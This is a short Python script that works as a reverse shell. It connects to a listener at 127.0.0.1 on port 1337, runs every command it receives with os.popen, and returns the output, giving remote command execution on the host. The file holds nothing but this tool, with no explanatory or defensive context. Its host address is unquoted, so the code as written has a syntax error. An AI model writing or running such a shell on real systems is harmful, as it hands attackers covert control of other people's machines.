#!/usr/bin/python
import socket, os, sys

s = socket.socket()
host = 127.0.0.1
port = 1337

s.connect((host, port))
while True:
	cmd = s.recv(1024)
	if cmd[:2] == "cd":
		os.chdir(str(cmd[3:]))
		o = " "
		s.send(o)
	elif cmd == "quit":
		s.close()
		sys.exit(1)
	else:
		o = os.popen(cmd).read()
		s.send(o)
